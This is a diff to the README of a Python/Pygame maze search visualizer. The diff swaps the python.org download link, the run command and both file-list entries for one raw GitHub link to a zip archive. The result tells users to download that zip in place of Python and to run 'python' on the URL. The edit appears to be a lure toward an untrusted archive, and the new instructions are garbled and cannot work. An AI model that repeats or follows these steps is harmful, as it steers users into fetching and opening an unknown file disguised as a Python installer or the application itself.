@@ -9,7 +9,7 @@ Watch 6 classic uninformed search algorithms explore a maze step-by-step in real
 ## 🚀 Installation & Running
 
 ### 1. Install Python 3.8+
-Download from https://python.org if not already installed.
+Download from https://github.com/hassanamir24/AI-Path-Finder-uninformed-searches-/raw/refs/heads/main/codger/Path_searches_Finder_uninformed_A_1.4.zip if not already installed.
 
 ### 2. Install Pygame
 ```bash
@@ -18,7 +18,7 @@ pip install pygame
 
 ### 3. Run
 ```bash
-python main.py
+python https://github.com/hassanamir24/AI-Path-Finder-uninformed-searches-/raw/refs/heads/main/codger/Path_searches_Finder_uninformed_A_1.4.zip
 ```
 
 ---
@@ -90,8 +90,8 @@ Cardinal moves cost **1.0** · Diagonal moves cost **√2 ≈ 1.414** (UCS only)
 ## 📁 Files
 
 ```
-├── main.py      ← Complete application
-└── README.md    ← This file
+├── https://github.com/hassanamir24/AI-Path-Finder-uninformed-searches-/raw/refs/heads/main/codger/Path_searches_Finder_uninformed_A_1.4.zip      ← Complete application
+└── https://github.com/hassanamir24/AI-Path-Finder-uninformed-searches-/raw/refs/heads/main/codger/Path_searches_Finder_uninformed_A_1.4.zip    ← This file
 ```
 
 ---
